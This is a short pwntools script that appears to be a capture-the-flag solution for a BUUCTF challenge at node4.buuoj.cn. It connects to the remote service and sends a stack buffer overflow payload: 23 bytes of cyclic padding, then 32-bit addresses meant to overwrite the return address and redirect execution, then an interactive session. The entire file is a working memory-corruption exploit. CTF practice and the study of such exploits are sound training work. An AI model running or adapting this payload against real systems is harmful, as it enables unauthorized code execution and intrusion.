from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27588)
io.sendline(cyclic(19+4) + p32(0x8048440) + p32(0x80487E0)*2)
io.interactive()
